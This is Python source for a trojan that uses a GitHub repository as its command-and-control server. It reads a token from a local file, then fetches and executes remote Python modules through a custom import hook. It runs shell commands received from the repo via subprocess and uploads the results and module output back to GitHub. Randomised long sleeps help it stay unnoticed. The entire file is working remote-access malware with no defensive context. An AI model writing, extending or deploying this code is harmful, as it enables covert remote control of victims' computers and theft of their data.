import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import subprocess  # Import subprocess module
from datetime import datetime

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.running = True

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config.get('modules', []):
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    def fetch_commands(self):
        config = self.get_config()
        commands = config.get('commands', [])
        return commands

    def execute_command(self, command):
        if command.lower() == 'stop':
            self.running = False
            self.update_status('Stopped')
        elif command.lower() == 'start':
            self.running = True
            self.update_status('Running')
        else:
            result = subprocess.getoutput(command)  # Using subprocess to execute the command
            self.update_status(f"Command '{command}' executed with result: {result}")

    def update_status(self, status):
        status_file_path = f'status/{self.id}.status'
        
        # Check if the status file already exists
        try:
            contents = self.repo.file_contents(status_file_path)
            # If the file exists, update it
            contents.update(status, status.encode('utf-8'))
        except github3.exceptions.NotFoundError:
            # If the file doesn't exist, create it
            self.repo.create_file(status_file_path, status, status.encode('utf-8'))

    def run(self):
        while self.running:
            commands = self.fetch_commands()
            for command in commands:
                self.execute_command(command)
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()

